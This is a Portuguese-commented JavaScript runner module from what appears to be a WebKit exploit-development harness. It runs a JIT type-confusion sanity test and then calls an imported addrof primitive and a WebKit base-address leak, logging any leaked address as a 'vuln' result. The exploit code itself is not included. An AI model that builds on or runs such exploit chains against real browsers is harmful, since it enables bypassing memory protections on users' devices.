// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 95 - WebKit Leak com Logs Verbosos)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43, 
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT // O nome da constante continua o mesmo, mas aponta para o novo módulo
} from './testArrayBufferVictimCrash.mjs';
import { AdvancedInt64 } from '../utils.mjs';

// Teste de JIT não modificado, permanece como um teste de sanidade útil.
async function testJITBehavior() {
    logS3("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    logS3("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);
    
    logS3(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        logS3("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        logS3("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    logS3("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R95"; // Nome do Runner atualizado para R95
    logS3(`==== INICIANDO Estratégia de Reprodução (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R95: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R95: Teste de L/E completou.`, "good", FNAME_RUNNER);
        const webkitLeakResult = result.webkit_leak_result;

        if (webkitLeakResult) {
            logS3(`  RUNNER R95: Resultado do Vazamento da Base WebKit: ${webkitLeakResult.msg}`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
            if(webkitLeakResult.success) {
                logS3(`  RUNNER R95: Endereço Base da WebKit Encontrado: ${webkitLeakResult.webkit_base_candidate}`, "vuln", FNAME_RUNNER);
                document.title = `${module_name_for_title}: WebKit Base Leaked!`;
            } else {
                 document.title = `${module_name_for_title}: WebKit Leak FAILED`;
            }
        } else {
            logS3(`  RUNNER R95: Teste WebKit Base Leak não produziu resultado.`, "warn", FNAME_RUNNER);
            document.title = `${module_name_for_title}: WebKit Leak No Result`;
        }
    } else {
        document.title = `${module_name_for_title}: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R95 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await testJITBehavior();
    await PAUSE_S3(500);
    
    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
    logS3(`\n==== Script 3 R95 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
}
